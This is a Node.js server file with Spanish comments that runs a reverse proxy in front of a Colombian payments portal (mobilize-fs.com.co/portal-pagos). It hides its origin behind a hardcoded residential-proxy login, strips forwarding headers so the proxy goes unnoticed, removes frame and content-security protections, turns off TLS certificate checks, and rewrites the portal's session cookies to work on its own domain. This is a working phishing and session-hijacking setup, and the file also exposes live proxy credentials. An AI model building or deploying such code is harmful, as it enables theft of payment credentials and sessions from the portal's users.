const express = require("express");
const https = require("https");
const path = require("path");
const { HttpsProxyAgent } = require("https-proxy-agent");

const app = express();

// ============================================================
// GEONODE PROXY RESIDENCIAL COLOMBIA
// ============================================================
const PROXY_USER = "geonode_PKlL1yvoTG-country-co";
const PROXY_PASS = "605d224e-19b6-4baa-8107-296ee7d836f5";
const PROXY_HOST = "proxy.geonode.io";
const PROXY_PORT = 9000;

const geoAgent = new HttpsProxyAgent(
  `http://${PROXY_USER}:${PROXY_PASS}@${PROXY_HOST}:${PROXY_PORT}`
);

// Permitir certificados de Geonode/Mobilize
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

const MOBILIZE = "www.mobilize-fs.com.co";

// ============================================================
// ARCHIVOS PROPIOS en /app/*
// ============================================================
app.use("/app", express.static(__dirname));

// Raíz → redirigir a nuestra app
app.get("/", (req, res) => res.redirect("/app/"));

// Health check
app.get("/health", (req, res) => res.json({ status: "ok", mode: "proxy+iframe" }));

// ============================================================
// PROXY REVERSO — todo lo demás va a Mobilize
// ============================================================
app.use((req, res) => {
  const targetUrl = `https://${MOBILIZE}${req.url}`;

  // Preparar headers para Mobilize
  const fwdHeaders = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const lk = k.toLowerCase();
    // Omitir headers que delatan el proxy
    if ([
      "host", "x-forwarded-for", "x-forwarded-proto",
      "x-forwarded-host", "x-forwarded-port",
      "x-real-ip", "cf-connecting-ip", "cf-ray",
      "connection", "upgrade",
    ].includes(lk)) continue;
    fwdHeaders[lk] = v;
  }
  fwdHeaders["host"] = MOBILIZE;
  fwdHeaders["referer"] = `https://${MOBILIZE}/portal-pagos/`;
  fwdHeaders["origin"] = `https://${MOBILIZE}`;

  // No pedir compresión para poder modificar HTML si es necesario
  delete fwdHeaders["accept-encoding"];

  const proxyReq = https.request(
    targetUrl,
    {
      method: req.method,
      headers: fwdHeaders,
      agent: geoAgent,
    },
    (proxyRes) => {
      // Copiar headers de respuesta, quitando los que bloquean iframes
      const resHeaders = {};
      for (const [k, v] of Object.entries(proxyRes.headers)) {
        const lk = k.toLowerCase();
        if (lk === "x-frame-options") continue;
        if (lk === "content-security-policy") continue;
        if (lk === "content-security-policy-report-only") continue;
        resHeaders[k] = v;
      }

      // Arreglar cookies — quitar domain y secure para que funcionen en nuestro dominio
      if (resHeaders["set-cookie"]) {
        const cookies = Array.isArray(resHeaders["set-cookie"])
          ? resHeaders["set-cookie"]
          : [resHeaders["set-cookie"]];
        resHeaders["set-cookie"] = cookies.map((c) =>
          c
            .replace(/;\s*domain=[^;]*/gi, "")
            .replace(/;\s*secure/gi, "")
            .replace(/;\s*samesite=none/gi, "; SameSite=Lax")
        );
      }

      // Reescribir redirects para que pasen por nuestro proxy
      if (resHeaders["location"]) {
        resHeaders["location"] = resHeaders["location"].replace(
          `https://${MOBILIZE}`,
          ""
        );
      }

      res.writeHead(proxyRes.statusCode, resHeaders);
      proxyRes.pipe(res);
    }
  );

  proxyReq.on("error", (err) => {
    console.error("[PROXY]", req.method, req.url, "→", err.message);
    if (!res.headersSent) {
      res.status(502).json({ error: "Proxy error: " + err.message });
    }
  });

  // Pasar body para POST/PUT/PATCH
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
    req.pipe(proxyReq);
  } else {
    proxyReq.end();
  }
});

// ============================================================
// INICIAR
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✓ Mobilize Proxy+Iframe → http://localhost:${PORT}`);
  console.log(`  App custom:   /app/`);
  console.log(`  Portal real:  /portal-pagos/  (proxy → ${MOBILIZE})`);
});
